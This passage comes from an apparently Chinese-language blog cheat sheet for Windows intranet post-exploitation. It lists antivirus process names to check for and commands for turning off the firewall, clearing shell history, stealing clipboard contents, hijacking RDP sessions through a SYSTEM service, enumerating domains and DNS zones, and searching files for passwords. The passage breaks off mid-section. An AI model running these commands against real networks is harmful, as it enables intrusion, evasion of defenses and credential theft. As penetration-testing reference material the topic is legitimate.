class="string">"ananwidget.exe"</span>,    <span class="string">"墨者安全专家"</span>},</span><br><span class="line">{<span class="string">"AVK.exe"</span>,    <span class="string">"GData"</span>},</span><br><span class="line">{<span class="string">"ccapp.exe"</span>,    <span class="string">"Symantec Norton"</span>},</span><br><span class="line">{<span class="string">"avg.exe"</span>,    <span class="string">"AVG Anti-Virus"</span>},</span><br><span class="line">{<span class="string">"spidernt.exe"</span>,    <span class="string">"Dr.web"</span>},</span><br><span class="line">{<span class="string">"Mcshield.exe"</span>,    <span class="string">"Mcafee"</span>},</span><br><span class="line">{<span class="string">"avgaurd.exe"</span>,    <span class="string">"Avira Antivir"</span>},</span><br><span class="line">{<span class="string">"F-PROT.exe"</span>,    <span class="string">"F-Prot AntiVirus"</span>},</span><br><span class="line">{<span class="string">"vsmon.exe"</span>,    <span class="string">"ZoneAlarm"</span>},</span><br><span class="line">{<span class="string">"avp.exee"</span>,    <span class="string">"Kaspersky"</span>},</span><br><span class="line">{<span class="string">"cpf.exe"</span>,    <span class="string">"Comodo"</span>},</span><br><span class="line">{<span class="string">"outpost.exe"</span>,    <span class="string">"Outpost Firewall"</span>},</span><br><span class="line">{<span class="string">"rfwmain.exe"</span>,    <span class="string">"瑞星防火墙"</span>},</span><br><span class="line">{<span class="string">"kpfwtray.exe"</span>,    <span class="string">"金山网镖"</span>},</span><br><span class="line">{<span class="string">"FYFireWall.exe"</span>,    <span class="string">"风云防火墙"</span>},</span><br><span class="line">{<span class="string">"MPMon.exe"</span>,    <span class="string">"微点主动防御"</span>},</span><br><span class="line">{<span class="string">"pfw.exe"</span>,    <span class="string">"天网防火墙"</span>},</span><br><span class="line">{<span class="string">"S.exe"</span>,    <span class="string">"在抓鸡"</span>},</span><br><span class="line">{<span class="string">"1433.exe"</span>,    <span class="string">"在扫1433"</span>},</span><br><span class="line">{<span class="string">"DUB.exe"</span>,    <span class="string">"在爆破"</span>},</span><br><span class="line">{<span class="string">"ServUDaemon.exe"</span>,    <span class="string">"发现S-U"</span>},</span><br><span class="line">{<span class="string">"BaiduSdSvc.exe"</span>,    <span class="string">"百度杀软"</span>},</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">安全狗</span><br><span class="line">SafeDogGuardCenter<span class="selector-class">.exe</span></span><br><span class="line">safedogupdatecenter<span class="selector-class">.exe</span></span><br><span class="line">safedogguardcenter<span class="selector-class">.exe</span></span><br><span class="line">SafeDogSiteIIS<span class="selector-class">.exe</span></span><br><span class="line">SafeDogTray<span class="selector-class">.exe</span></span><br><span class="line">SafeDogServerUI<span class="selector-class">.exe</span></span><br><span class="line"></span><br><span class="line">D盾</span><br><span class="line">D_Safe_Manage<span class="selector-class">.exe</span></span><br><span class="line">d_manage<span class="selector-class">.exe</span></span><br><span class="line"></span><br><span class="line">云锁</span><br><span class="line">yunsuo_agent_service<span class="selector-class">.exe</span></span><br><span class="line">yunsuo_agent_daemon<span class="selector-class">.exe</span></span><br><span class="line"></span><br><span class="line">护卫神</span><br><span class="line">HwsPanel<span class="selector-class">.exe</span>  护卫神·入侵防护系统（状态托盘）</span><br><span class="line">hws_ui<span class="selector-class">.exe</span>    护卫神·入侵防护系统 - www<span class="selector-class">.huweishen</span><span class="selector-class">.com</span></span><br><span class="line">hws<span class="selector-class">.exe</span>       护卫神·入侵防护系统 服务处理程序</span><br><span class="line">hwsd<span class="selector-class">.exe</span>      护卫神·入侵防护系统 监控组件</span><br><span class="line"></span><br><span class="line">火绒</span><br><span class="line">hipstray<span class="selector-class">.exe</span></span><br><span class="line">wsctrl<span class="selector-class">.exe</span></span><br><span class="line">usysdiag.exe</span><br></pre></td></tr></tbody></table></figure>

<p><code>wmic startup get command,caption # 查看启动项</code></p>
<p><code>schtasks /query /fo LIST /v # 查看任务计划</code></p>
<p>windows ⾃带防⽕墙及特殊过滤规则等⽹络访问均可使⽤ netsh 及相关命令查看。</p>
<figure class="highlight routeros"><table><tbody><tr><td class="code"><pre><span class="line">netsh<span class="built_in"> firewall </span>show<span class="built_in"> config </span>     # 查看防⽕墙信息，但<span class="built_in"> firewall </span>命令已弃⽤，可使⽤ advfirewall 命令代替 </span><br><span class="line">netsh advfirewall<span class="built_in"> firewall </span>show rule <span class="attribute">name</span>=all      # 查看配置规则</span><br><span class="line">netsh advfirewall <span class="builtin-name">set</span> allprofiles state off\on     # 关闭防⽕墙\开启防⽕墙 </span><br><span class="line">netsh advfirewall export\import xx.pol     # 导出\导⼊配置⽂件</span><br><span class="line">netsh advfirewall<span class="built_in"> firewall </span><span class="builtin-name">add</span> rule <span class="attribute">name</span>=”deny tcp 139″ <span class="attribute">dir</span>=in pr <span class="attribute">otocol</span>=tcp <span class="attribute">localport</span>=139 <span class="attribute">action</span>=block      # 新建规则阻⽌TCP协议139端⼝ </span><br><span class="line">netsh advfirewall<span class="built_in"> firewall </span><span class="builtin-name">add</span> rule <span class="attribute">name</span>=<span class="string">"Remote Desktop"</span> protoco <span class="attribute">l</span>=TCP <span class="attribute">dir</span>=in <span class="attribute">localport</span>=3389 <span class="attribute">action</span>=allow             # 新建规则允 许3389通过防⽕墙 </span><br><span class="line">netsh advfirewall<span class="built_in"> firewall </span>delete rule <span class="attribute">name</span>=Remote Desktop      # 删除名为Remote Desktop的规则 </span><br><span class="line">netsh<span class="built_in"> interface </span>       # 连接安全规则配置， 很少配置</span><br></pre></td></tr></tbody></table></figure>

<h4 id="3、用户信息"><a href="#3、用户信息" class="headerlink" title="3、用户信息"></a>3、用户信息</h4><figure class="highlight nsis"><table><tbody><tr><td class="code"><pre><span class="line">whoami    <span class="comment"># 当前⽤户 </span></span><br><span class="line">quser    <span class="comment"># 查询登录⽤户，同 query user </span></span><br><span class="line">qwinsta   <span class="comment"># 查询登录⽤户，同 query user </span></span><br><span class="line">query <span class="literal">user</span>   <span class="comment"># 查询登录⽤户 </span></span><br><span class="line">query session    <span class="comment"># 查询会话 </span></span><br><span class="line">query termserver    <span class="comment"># 查询远程桌⾯主机列表。 </span></span><br><span class="line">net accounts   <span class="comment"># 查询域密码策略 </span></span><br><span class="line">net <span class="literal">user</span>    <span class="comment"># 查询本地⽤户列表</span></span><br><span class="line">net <span class="literal">user</span> <span class="string">"<span class="variable">$username</span>"</span>    <span class="comment"># 查询指定⽤户 </span></span><br><span class="line">net localgroup   <span class="comment"># 查询本地⽤户组列表 </span></span><br><span class="line">net localgroup <span class="string">"<span class="variable">$groupname</span>"</span>    <span class="comment"># 查询指定⽤户组成员 </span></span><br><span class="line">net group   <span class="comment"># 仅域控可执⾏，查询⽤户组列 表 </span></span><br><span class="line">net group <span class="string">"<span class="variable">$groupname</span>"</span>    <span class="comment"># 仅域控可执⾏，查询⽤户组成 员</span></span><br></pre></td></tr></tbody></table></figure>

<p>注： <code>quser</code> 、 <code>qwinsta</code> 和 <code>query</code> 命令只存在于允许安装 RDP 服务的主机上，官⽅描述其仅存在于 server 2012 及以上版本存在。其中 <code>query termserver</code> 命令存在问题，本地测试时与描述严重不符， ⽆法列出信息。</p>
<h4 id="4、操作记录"><a href="#4、操作记录" class="headerlink" title="4、操作记录"></a>4、操作记录</h4><p>cmd 和 powershell v3 以下的操作记录⽆法⻓时间报存，仅限当前窗⼝。</p>
<figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">Get-History</span> | <span class="built_in">Format-List</span> <span class="literal">-Property</span> *     <span class="comment"># 查询 powershell 当前 窗⼝历史操作记录</span></span><br><span class="line"><span class="built_in">Clear-History</span>   <span class="comment"># 删除 powershell 当前 窗⼝历史操作记录</span></span><br><span class="line"><span class="built_in">Clear-History</span> <span class="literal">-Id</span> <span class="number">3</span>    <span class="comment"># 删除 powershell 当前 窗⼝指定 ID 的历史操作记录</span></span><br><span class="line">doskey /<span class="built_in">h</span>    <span class="comment"># 查看 cmd 的历史操作记 录</span></span><br><span class="line">doskey /reinstall    <span class="comment"># 删除 cmd 的历史操作记 录</span></span><br></pre></td></tr></tbody></table></figure>

<p>可以通过向进程发送键盘内容的⽅式将运⾏中的窗⼝历史操作记录导出，详情参考⼦菜单 <code>get- history</code> 。</p>
<p>powershell v5 以上的操作历史记录会直接保存在指定⽂件中。直接查看即可。</p>
<figure class="highlight taggerscript"><table><tbody><tr><td class="code"><pre><span class="line"># 查看 powershell 历史操作记录</span><br><span class="line">type <span class="variable">%appdata%</span><span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows<span class="symbol">\P</span>owerShell<span class="symbol">\P</span>SReadline<span class="symbol">\C</span>onsoleHost _history.txt</span><br></pre></td></tr></tbody></table></figure>

<p>powershell v3、v4 版本需要安装 <code>Get-PSReadlineOption</code> 。</p>
<p><code>msiexec /q /i PackageManagement_x64.msi</code></p>
<h4 id="5、剪切板信息收集"><a href="#5、剪切板信息收集" class="headerlink" title="5、剪切板信息收集"></a>5、剪切板信息收集</h4><p>不同⽤户之间的剪切板没有关联，使⽤微软⾃带的 mstsc 建⽴ rdp 远程连接时，剪切板内容会同步。<br>利⽤⼯具可以定期将剪切板内容导出，从⽽达到信息收集的⽬的。</p>
<p><strong>当前剪切板</strong> </p>
<p>在empire中有⼀个Get-ClipboardContents.ps1，可以⽤empire或者coablt strike加载该脚本。或者也 可以⾃⼰编写相关脚本使⽤。是⼀个相对简单的⼯具。</p>
<p><strong>rdplicp</strong></p>
<p>在使⽤ mstsc 进⾏远程桌⾯的时候，会启动⼀个叫 rdpclip.exe 的进程，该进程的功能是同步服务端与客 户端的剪贴板。 </p>
<p>由于启动该进程时，会⾃动同步剪切板内容，因此当⽬标⽬标机器与其他机器使⽤ mstsc 建⽴ RDP 远程 连接时，就可以通过读取 rdplicp.exe 进程数据，进⾏剪贴板窃取，以尽可能地获取更多地信息。 </p>
<p>此外，由于由于该进程时后台运⾏的，当管理员同时⽤远程桌⾯登陆多个服务器，在其中得某⼀个服务器 上进⾏复制拷⻉操作时，会将数据同步到所有服务器的 rdplicp.exe 进程。</p>
<h4 id="6、会话劫持"><a href="#6、会话劫持" class="headerlink" title="6、会话劫持"></a>6、会话劫持</h4><p>windows 系统下，不同⽤户登录时会有不同的 session ID ，⽽当前⽤户只能看到当前⽤户 session ID 下的内容。 </p>
<p>例如： tsclient 只有建⽴远程连接的⽤户才可以看到，和访问到。</p>
<p>同过某些⽅式劫持其他⽤户会话，可以进⼀步收集信息。</p>
<p><strong>tscon</strong></p>
<p>在系统权限下可以通过 tscon 命令去接管其他⼈的桌⾯。但是需要注意的是，如果接管时⽬标⽤户正在连 接状态，则会被强制踢下线。 </p>
<p>但是如果⽤户已经断开连接，此时接管桌⾯就不会产⽣其他额外影响。只要不破坏原有桌⾯打开内容，布 局，当断开连接后，⽤户再次登录基本⽆感。</p>
<p><code>tscon 需要劫持的会话ID /dest:当前⽤户会话名</code></p>
<p>但是需要注意的是，该命令需要系统权限执⾏。同时，由于是直接接管 session ID 对应的桌⾯，会把正在 使⽤的⽤户踢下线，所以是⽆法访问 <code>tsclient</code> 的。</p>
<p>同时，如果开启了远程桌⾯授权验证，则使⽤该⽅法时，需要输⼊密码才能进⼊桌⾯环境。 </p>
<p>由于需要 system 权限才能启动，因此需要先提权⾄ system 。除第三⽅提权⼯具以外，还可以利⽤服务 启动时默认的 system 权限来执⾏。</p>
<p>⽅法如下：<br><code>sc create sesshijack binpath= "cmd.exe /k tscon 需要劫持的会话ID /des t:当前⽤户会话名"</code></p>
<p>除使⽤服务的 system 权限执⾏以外。mimikatz 也具有该功能，或者使⽤ psexec 提权⾄ system 均 可。</p>
<p><strong>RunInSession</strong><br>RunInSession 这款⼯具可以实现在指定 session ID 下启动执⾏程序或脚本。利⽤该⼯具可以实现在不强 制其他⽤户下线的情况下获取情报，最直接的有剪切板窃取和 <code>tsclient</code> 的访问。</p>
<p>使⽤⽅法：<br><code>RunInSession.exe $sessionid $</code></p>
<p>例如：<br> <code>RunInSession.exe 2 c:\1.bat</code></p>
<p><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/51958b6b7cb94f338fa79a422151ebac.png"><br><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/5052d136ae514f76b11bfcb9a32b93c8.png"></p>
<p>该⼯具需要在管理员权限下执⾏。</p>
<p>⼯具下载地址：<a target="_blank" rel="noopener" href="https://github.com/l3m0n/pentest_tools/blob/master/%E5%86%85%E2%BD%B9%E6%94%BB%E9%98%B2/%E8%BF%9C%E7%A8%8B%E8%BF%9E">https://github.com/l3m0n/pentest_tools/blob/master/内⽹攻防/远程连</a> 接/RunInSession.zip</p>
<h3 id="⽹络发现"><a href="#⽹络发现" class="headerlink" title="⽹络发现"></a>⽹络发现</h3><p>内⽹⽹络发现是⼀个很重要的信息收集内容，⼀般情况下是不建议使⽤扫描器扫描，尤其不建议使⽤ nmap，当然，如果是靶场，或是甲⽅授权就另当别论。</p>
<h4 id="1、基本信息收集"><a href="#1、基本信息收集" class="headerlink" title="1、基本信息收集"></a>1、基本信息收集</h4><figure class="highlight gauss"><table><tbody><tr><td class="code"><pre><span class="line">ipconfig /all    <span class="meta"># 列出当前主机详细⽹络信息 </span></span><br><span class="line">ipconfig /displaydns  <span class="meta"># 列出dns缓存信息 </span></span><br><span class="line">route <span class="keyword">print</span>    <span class="meta"># 查询路由表</span></span><br><span class="line">arp -a    <span class="meta"># 地址解析协议缓存表</span></span><br><span class="line">netstat -ano    <span class="meta"># 端⼝使⽤情况 </span></span><br><span class="line">net share    <span class="meta"># 查看共享信息</span></span><br><span class="line">net <span class="built_in">view</span>   <span class="meta"># 查看共享资源列表</span></span><br><span class="line">wmic share get name,path,status    <span class="meta"># 查看共享信息 </span></span><br><span class="line"><span class="meta"># 查看 host ⽂件 </span></span><br><span class="line"><span class="built_in">type</span> c:\Windows\system32\drivers\etc\hosts</span><br></pre></td></tr></tbody></table></figure>

<p>使⽤arp命令收集最近建⽴过连接的ip，但是此⽅法在某些时候⽆法收集到⽹段外的ip地址。</p>
<h4 id="2、SPN信息收集"><a href="#2、SPN信息收集" class="headerlink" title="2、SPN信息收集"></a>2、SPN信息收集</h4><p>SPN：服务主体名称。使⽤Kerberos须为服务器注册SPN，因此可以在内⽹中扫描SPN，快速寻找内⽹中 注册的服务，SPN扫描可以规避像端⼝扫描的不确定性探测动作。 主要利⽤⼯具有：setspn、GetUserSPNs.vbs和Rubeus。</p>
<p>利⽤ Windows ⾃带的 setspn ⼯具 </p>
<p>普通域⽤户权限执⾏即可</p>
<p><code>setspn -T domain.com -Q */*</code></p>
<p>利⽤ GetUserSPNs.vbs </p>
<p>使⽤ Rubeus ⼯具</p>
<h4 id="3、协议探测"><a href="#3、协议探测" class="headerlink" title="3、协议探测"></a>3、协议探测</h4><p><strong>icmp 协议</strong></p>
<p>直接回显</p>
<p><code>for /l %i in (1,1,255) do @ ping 10.0.0.%i -w 1 -n 1|find /i "ttl ="</code></p>
<p>输出⽂件<br><code>@for /l %i in (1,1,255) do @ping -n 1 -w 40 192.168.0.%i &amp; if erro rlevel 1 (echo 192.168.0.%i &gt;&gt; ip.txt) else (echo 192.168.0.%i &gt;&gt; ip.txt)</code></p>
<p><strong>Netbios 协议</strong></p>
<p>msf 扫描 </p>
<p><code>msf &gt; use auxiliary/scanner/netbios/nbname</code></p>
<p>nbtscan 扫描 </p>
<p>下载：<a target="_blank" rel="noopener" href="http://www.unixwiz.net/tools/nbtscan.html#download">http://www.unixwiz.net/tools/nbtscan.html#download</a></p>
<p><code>nbtscan -m 192.168.1.0/24</code></p>
<p><strong>UDP 协议</strong></p>
<p>msf</p>
<figure class="highlight awk"><table><tbody><tr><td class="code"><pre><span class="line">msf &gt; use auxiliary<span class="regexp">/scanner/</span>discovery/udp_probe</span><br><span class="line">msf &gt; use auxiliary<span class="regexp">/scanner/</span>discovery/udp_sweep</span><br></pre></td></tr></tbody></table></figure>

<p><strong>smb-version</strong></p>
<p>python版：<a target="_blank" rel="noopener" href="https://github.com/amitn322/smb-version">https://github.com/amitn322/smb-version</a> </p>
<p>c#版：<a target="_blank" rel="noopener" href="https://www.zcgonvh.com/post/CSharp_smb_version_Detection.html">https://www.zcgonvh.com/post/CSharp_smb_version_Detection.html</a></p>
<p><strong>SNMP 协议</strong></p>
<p>msf</p>
<p><code>msf &gt; use auxiliary/scanner/snmp/snmp_enum</code></p>
<h4 id="4、系统⽇志"><a href="#4、系统⽇志" class="headerlink" title="4、系统⽇志"></a>4、系统⽇志</h4><p>可以使⽤ wevtutil.exe psloglist.exe 或者 powershell 的 Get-WinEvent 模块进⾏⽇志导出，server 03 的域控可使⽤ eventquery.vbs 导出。</p>
<p>wevtutil不需要UAC， ⽀持很多过滤语法，若有需要请查看官⽅说明</p>
 <figure class="highlight jboss-cli"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># 查询登录⽇志语法 wevtutil qe security /f:text /q:*[System[(EventID=4624)]] </span></span><br><span class="line"> <span class="comment"># 查询所有登录、注销相关的⽇志语法</span></span><br><span class="line">wevtutil qe security <span class="string">/rd</span><span class="function">:true</span> <span class="string">/f</span><span class="function">:text</span> <span class="string">/q</span>:<span class="string">"*[system/eventid=4624 an d 4623 and 4627]"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 远程查询时在后⾯加⼊/r:computer /u:user /p:password ⽐如查询dc1上的登录 注销⽇志</span></span><br><span class="line"></span><br><span class="line">wevtutil qe security <span class="string">/rd</span><span class="function">:true</span> <span class="string">/f</span><span class="function">:text</span> <span class="string">/q</span>:<span class="string">"*[system/eventid=4624 an d 4623 and 4672]"</span> <span class="string">/r</span><span class="function">:dc1</span> <span class="string">/u</span><span class="function">:administrator</span> <span class="string">/p</span><span class="function">:password</span></span><br></pre></td></tr></tbody></table></figure>

<p>本地使⽤LogParser⽇志分析⼯具整理导出的⽇志，然后去除重复数据、⽆效数据（以’$’结束的⽤户名）</p>
<p><code>LogParser.exe -i:EVT -o txt "SELECT TO_UPPERCASE(EXTRACT_TOKEN(Str ings,5,'|')) as USERNAME,TO_UPPERCASE(EXTRACT_TOKEN(Strings,1 8,'|')) as SOURCE_IP FROM C:\ProgramData\log.evtx" &gt; C:\ProgramDat a\log.txt</code></p>
<figure class="highlight jboss-cli"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># 导出域控登录⽇志到域控上</span></span><br><span class="line">wevtutil epl Security C:\ProgramData\dc.evtx <span class="string">/q</span>:<span class="string">"*[EventData[Data [@Name='LogonType']='3'] and System[(EventID=4624) and TimeCreated [timediff(@SystemTime) &lt;= 2592000000]]]"</span> <span class="string">/r</span>:域控IP <span class="string">/u</span>:域管 <span class="string">/p</span>:域管密 码</span><br></pre></td></tr></tbody></table></figure>

<h4 id="5、浏览器⽇志"><a href="#5、浏览器⽇志" class="headerlink" title="5、浏览器⽇志"></a>5、浏览器⽇志</h4><p>收集浏览器访问记录。</p>
<figure class="highlight taggerscript"><table><tbody><tr><td class="code"><pre><span class="line"># chrome </span><br><span class="line">C:<span class="symbol">\U</span>sers<span class="symbol">\$</span>username<span class="symbol">\A</span>ppData<span class="symbol">\L</span>ocal<span class="symbol">\G</span>oogle<span class="symbol">\C</span>hrome<span class="symbol">\U</span>ser Data<span class="symbol">\D</span>efault <span class="symbol">\H</span>istory </span><br><span class="line"># firefox 5 </span><br><span class="line">C:<span class="symbol">\U</span>sers<span class="symbol">\$</span>username<span class="symbol">\A</span>ppData<span class="symbol">\R</span>oaming<span class="symbol">\M</span>ozilla<span class="symbol">\F</span>irefox<span class="symbol">\P</span>rofiles<span class="symbol">\$</span>nam e.default<span class="symbol">\p</span>laces.sqlite </span><br><span class="line"># IE</span><br><span class="line">reg query "HKEY_CURRENT_USER<span class="symbol">\S</span>oftware<span class="symbol">\M</span>icrosoft<span class="symbol">\I</span>nternet Explorer <span class="symbol">\T</span>ypedURLs"</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line"></span><br><span class="line">C:<span class="symbol">\U</span>sers<span class="symbol">\$</span>user<span class="symbol">\A</span>ppData<span class="symbol">\L</span>ocal<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows<span class="symbol">\H</span>istory</span><br><span class="line"></span><br><span class="line"># edge</span><br><span class="line"></span><br><span class="line"># v79+</span><br><span class="line"></span><br><span class="line"> C:<span class="symbol">\U</span>sers<span class="symbol">\$</span>user<span class="symbol">\A</span>ppData<span class="symbol">\L</span>ocal<span class="symbol">\M</span>icrosoft<span class="symbol">\E</span>dge<span class="symbol">\U</span>ser Data<span class="symbol">\D</span>efault<span class="symbol">\H</span>istory</span><br><span class="line"></span><br><span class="line"># v44+</span><br><span class="line"></span><br><span class="line">C:<span class="symbol">\U</span>sers<span class="symbol">\$</span>user<span class="symbol">\A</span>ppData<span class="symbol">\L</span>ocal<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows<span class="symbol">\W</span>ebCache<span class="symbol">\W</span>ebCacheV 01.dat</span><br></pre></td></tr></tbody></table></figure>

<p>浏览器的历史记录⽂件 history，是使⽤ sqlite 格式记录的，直接打开是⼀个⼆进制⽂件，可以下载到本地破解，或者直接替换查看。 </p>
<p>需要注意的是，edge v44+ 版本的历史记录⽂件在⽤户登录状态下是锁定的。</p>
<h4 id="6、DNS服务器记录"><a href="#6、DNS服务器记录" class="headerlink" title="6、DNS服务器记录"></a>6、DNS服务器记录</h4><p>如果⽬标机器在域内，只需要按部就班收集域信息，准备域横向渗透即可。</p>
<p>但其中有⼀点单独提⼀下，⼀般在域环境中都会有⼀台 DNS 服务器，⼩企业或内⽹环境较⼩的可能会和 域控为同⼀台，⼤⼀些的企业，多为独⽴的 DNS 服务器。 </p>
<p>由于 DNS 服务器的特性，因此，在 DNS 服务器上会存在⼤量内⽹地址解析记录，如果可以获取，会极⼤ 的⽅便内⽹拓扑展开，同时很多其他主机⽆法到达的地址，DNS 服务器是可以到达的。</p>
<figure class="highlight jboss-cli"><table><tbody><tr><td class="code"><pre><span class="line">dnscmd . <span class="string">/EnumZones</span>     <span class="comment"># 列出 DNS 区域中当 前节点的资源记录 </span></span><br><span class="line">dnscmd . <span class="string">/ZoneInfo</span> test.com     <span class="comment"># 列出 test.com 的 信息</span></span><br><span class="line">dnscmd . <span class="string">/ZonePrint</span> test.com     <span class="comment"># 列出 test.com 中 的详细记录</span></span><br><span class="line">dnscmd . <span class="string">/EnumRecords</span> test.com .     <span class="comment"># 列出 test.com 中 的记录</span></span><br></pre></td></tr></tbody></table></figure>
<p>DNS 记录有正向解析和反向解析两种。  </p>
<p>正向解析是从域名到IP，反向解析则是从IP到域名。<br>反向隔离和正向隔离相同，都会有⼀个对应的区域，因此，查询⽅式与正向记录相同。</p>
<p>DNS 服务器还存在域传送漏洞。可以直接获得 DNS 记录。</p>
<figure class="highlight vim"><table><tbody><tr><td class="code"><pre><span class="line">nslookup -<span class="built_in">type</span>=all_ldap._tcp.dc.greyfinger.<span class="keyword">com</span> </span><br><span class="line">nslookup -<span class="built_in">type</span>=ns domain.<span class="keyword">com</span> </span><br><span class="line">nslookup </span><br><span class="line">sserver dns.domain.<span class="keyword">com</span> </span><br><span class="line"><span class="keyword">ls</span> domain.<span class="keyword">com</span></span><br></pre></td></tr></tbody></table></figure>

<h3 id="域信息查询"><a href="#域信息查询" class="headerlink" title="域信息查询"></a>域信息查询</h3><h4 id="1、基本信息收集-1"><a href="#1、基本信息收集-1" class="headerlink" title="1、基本信息收集"></a>1、基本信息收集</h4><p>域信息收集，需要当前⽤户为域⽤户。本地⽤户⽆法执⾏域命令查询域内容。 但是如果⽬标机器为域内机器，域⽤户未登陆，此时 system 权限下可以使⽤机器身份查询域命令。</p>
<figure class="highlight crmsh"><table><tbody><tr><td class="code"><pre><span class="line">net config workstation    <span class="comment"># 查询当前登录域 </span></span><br><span class="line">net time     <span class="comment"># 同步时间，通常为域控服务器 </span></span><br><span class="line">net accounts /domain    <span class="comment"># 查询域密码策略 </span></span><br><span class="line">net <span class="keyword">user</span> <span class="title">/domain</span>    <span class="comment"># 列出当前域成员列表 </span></span><br><span class="line">net <span class="keyword">user</span> <span class="title">username</span> /domain    <span class="comment"># 列出域成员详细信息 </span></span><br><span class="line">net <span class="keyword">group</span> <span class="title">/domain</span>    <span class="comment"># 列出域内组列表 </span></span><br><span class="line">net <span class="keyword">group</span> <span class="title">groupname</span> /domain     <span class="comment"># 列出域内组成员列表 </span></span><br><span class="line">net view     <span class="comment"># 查询同⼀域内机器列表</span></span><br><span class="line">net view /domain     <span class="comment"># 查询域列表 </span></span><br><span class="line">net view /domain:test     <span class="comment"># 查询 test 域中计算机列表 </span></span><br><span class="line">nltest /dclist:domain      <span class="comment"># 查询域内的所有DC </span></span><br><span class="line">nltest /dsgetdc:domain     <span class="comment"># 拿到DC当前的认证信息</span></span><br><span class="line">nltest /domain_trusts <span class="comment"># 查询域信任信息</span></span><br><span class="line">nltest /user:<span class="string">"username"</span> <span class="comment"># 得到⽤户信息</span></span><br></pre></td></tr></tbody></table></figure>

<p>想要定位域管和域控机器，可以查询 <code>domain admin</code> 和 <code>domain controllers</code> 组，需要注意的是，组 名会随系统语⾔变化⽽变化，如 <code>domain controllers</code> 会变化成 <code>domaine contrôleurs</code> 。</p>
<p>在域内其他机器上，查询组是 <code>net group /domain</code> ，⽽在域控上则是 <code>net group</code> 。</p>
<h4 id="2、dsquery"><a href="#2、dsquery" class="headerlink" title="2、dsquery"></a>2、dsquery</h4><p>dsquery命令很少使⽤，⽽且限制较⼤仅能在域控上执⾏，所以相对⽽⾔较为鸡肋，但是在⼀定条件下还 是具有⼀定的使⽤价值。</p>
<figure class="highlight crmsh"><table><tbody><tr><td class="code"><pre><span class="line">dsquery computer     <span class="comment"># 查询⽬录中的计算机 dsquery contact     # 查询⽬录中的联系⼈ </span></span><br><span class="line">dsquery subnet     <span class="comment"># 查询⽬录中的⼦⽹ </span></span><br><span class="line">dsquery <span class="keyword">group</span>     <span class="title"># 查询⽬录中的组 </span></span><br><span class="line"><span class="title">dsquery</span> site     <span class="comment"># 查询⽬录中的站点</span></span><br><span class="line">dsquery <span class="keyword">user</span>      <span class="title"># 查询⽬录中的⽤户</span></span><br></pre></td></tr></tbody></table></figure>

<h4 id="3、powershell"><a href="#3、powershell" class="headerlink" title="3、powershell"></a>3、powershell</h4> <figure class="highlight pgsql"><table><tbody><tr><td class="code"><pre><span class="line"># 查询当前<span class="keyword">Domain</span>信息</span><br><span class="line">[<span class="keyword">System</span>.DirectoryServices.ActiveDirectory.<span class="keyword">Domain</span>]::GetCurrentDoma <span class="keyword">in</span>()</span><br><span class="line"></span><br><span class="line"># 查询域信任关系</span><br><span class="line">([<span class="keyword">System</span>.DirectoryServices.ActiveDirectory.<span class="keyword">Domain</span>]::GetCurrentDom ain()).GetAllTrustRelationships()</span><br><span class="line"></span><br><span class="line"> # 查询当前林信息</span><br><span class="line">[<span class="keyword">System</span>.DirectoryServices.ActiveDirectory.Forest]::GetCurrentFore st()</span><br><span class="line"></span><br><span class="line"> # 查询林信任信息</span><br><span class="line">([<span class="keyword">System</span>.DirectoryServices.ActiveDirectory.Forest]::GetForest((Ne w-<span class="keyword">Object</span> <span class="keyword">System</span>.DirectoryServices.ActiveDirectory.DirectoryContex t(<span class="string">'Forest'</span>, <span class="string">'forest-of-interest.local'</span>)))).GetAllTrustRelationshi ps()</span><br></pre></td></tr></tbody></table></figure>

<h3 id="配置⽂件收集"><a href="#配置⽂件收集" class="headerlink" title="配置⽂件收集"></a>配置⽂件收集</h3><h4 id="1、findstr命令搜索"><a href="#1、findstr命令搜索" class="headerlink" title="1、findstr命令搜索"></a>1、findstr命令搜索</h4><p>与 linux 系统下的 find 命令类似，findstr 是 Window 系统⾃带的命令，⽤途是查找指定的⼀个或多个⽂ 件⽂件中包含某些特定字符串的⾏，并将该⾏完整的信息打印出来，或者打印查询字符串所在的⽂件名。</p>
<p>常⽤命令有： </p>
<figure class="highlight jboss-cli"><table><tbody><tr><td class="code"><pre><span class="line"><span class="string">/S</span>      <span class="comment"># 在当前⽬录和所有⼦⽬录中搜索匹配⽂件。</span></span><br><span class="line"><span class="string">/I</span>       <span class="comment"># 指定搜索不分⼤⼩写。</span></span><br><span class="line"><span class="string">/X</span>     <span class="comment"># 打印完全匹配的⾏。</span></span><br><span class="line"><span class="string">/M</span>     <span class="comment"># 如果⽂件含有匹配项，只打印其⽂件名。</span></span><br><span class="line"><span class="string">/D</span><span class="function">:dir</span>    <span class="comment"># 查找以分号为分隔符的⽬录列表 </span></span><br><span class="line"></span><br><span class="line">indstr <span class="string">/s</span> <span class="string">/m</span> <span class="string">"password"</span> *.* </span><br><span class="line">findstr <span class="string">/i</span> <span class="string">/s</span> <span class="string">"password"</span> *<span class="string">.config</span> </span><br><span class="line">findstr <span class="string">/i</span> <span class="string">/s</span> <span class="string">"password"</span> *<span class="string">.ini</span> </span><br><span class="line">findstr <span class="string">/i</span> <span class="string">/s</span> <span class="string">"password"</span> *<span class="string">.xml</span></span><br></pre></td></tr></tbody></table></figure>

<h4 id="2、常⻅位置"><a href="#2、常⻅位置" class="headerlink" title="2、常⻅位置"></a>2、常⻅位置</h4><p><strong>配置⽂件</strong></p>
<p>IIS配置⽂件路径为： <code>%windir%\system32\inetsrv\config\applicationHost.config</code></p>
<p>使⽤appcmd的⽅式可以快速导出所需内容:</p>
